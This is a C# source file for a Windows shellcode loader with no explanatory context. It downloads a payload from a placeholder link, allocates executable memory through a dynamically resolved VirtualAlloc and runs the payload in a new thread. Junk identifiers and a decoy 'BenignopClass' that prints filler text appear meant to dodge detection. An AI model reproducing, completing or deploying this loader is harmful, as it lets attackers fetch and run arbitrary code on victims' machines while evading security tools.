using System;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

class Program
{
    static void Main(string[] args)
    {
        // Replace [DOWNLOAD_LINK] with an actual download link
        string downloadLink = "[DOWNLOAD_LINK]";

        WebClient wc = new WebClient();
        byte[] sfhbsgjhgjghhbsjbvejs = wc.DownloadData(downloadLink);

        IntPtr addr = GetProcAddress(LoadLibrary("kernel32.dll"), "VirtualAlloc");
        VirtualAllocDelegate VirtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(addr, typeof(VirtualAllocDelegate));
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)sfhbsgjhgjghhbsjbvejs.Length, 0x3000, 0x40);

        Marshal.Copy(sfhbsgjhgjghhbsjbvejs, 0, mem, sfhbsgjhgjghhbsjbvejs.Length);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);

        dhdsfhbsgjhgjghhbsjbvejsfgdfg();
    }

    static void dhdsfhbsgjhgjghhbsjbvejsfgdfg()
    {
        // This method calls methods from BenignopClass
        // Make sure these methods exist in BenignopClass
        BenignopClass.mddhdsfhbsgjhgjghhbsjbvejsfgdfg1();
        BenignopClass.mddhdsfhbsgjhgjghhbsjbvejsfgdfg2();
        BenignopClass.mddhdsfhbsgjhgjghhbsjbvejsfgdfg3();
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr LoadLibrary(string dllName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    private delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
}

class BenignopClass
{
    public static void mddhdsfhbsgjhgjghhbsjbvejsfgdfg1()
    {
        Console.WriteLine("khan op.");
    }

    public static void mddhdsfhbsgjhgjghhbsjbvejsfgdfg2()
    {
        Console.WriteLine("khan khan.");
    }

    public static void mddhdsfhbsgjhgjghhbsjbvejsfgdfg3()
    {
        Console.WriteLine("bfjdsfkhansfhbdshfdsYet d khan.");
    }
}
